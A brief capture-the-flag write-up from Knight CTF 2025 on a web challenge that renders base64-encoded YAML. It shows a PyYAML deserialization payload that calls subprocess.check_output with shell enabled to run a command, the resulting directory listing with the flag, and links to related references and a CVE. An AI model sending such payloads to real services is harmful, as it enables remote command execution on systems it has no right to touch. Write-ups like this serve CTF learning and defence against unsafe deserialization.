---
date: 2025-01-22
description: PyYAML Code Execution
platform: Knight CTF 2025
categories: Web
tags:
  - yaml
  - PyYAML
  - RCE
duration:
---

Accepts yaml input as base64 and renders it on the website.  `yaml: {input} > base64`
Application is using yaml with python stack. Look for vulnerabilities on it library

# payload
```yaml
yaml: !!python/object/apply:subprocess.check_output
       args: [ ls ]
       kwds: { shell: true }
# convert to > base64 
```
```
b"Dockerfile\nKCTF{d38787fb0741bd0efdad8ed01f037740}\nWhy didn't they set this as read only\na\na.txt\napp\ndoesnotexist.txt\nhey.txt\nls\noutput.txt\nrequirements.txt\nstart.sh\nstatic\ntemp.txt\ntest\ntest.txt\nwhat if someone overwrite the flag??\nzab.txt\n"
```
References:
- https://hackmd.io/@harrier/uiuctf20
- https://trevorsaudi.medium.com/yaml-2-json-hackpack-ctf-7de28ef0ecff
- https://access.redhat.com/security/cve/cve-2020-14343
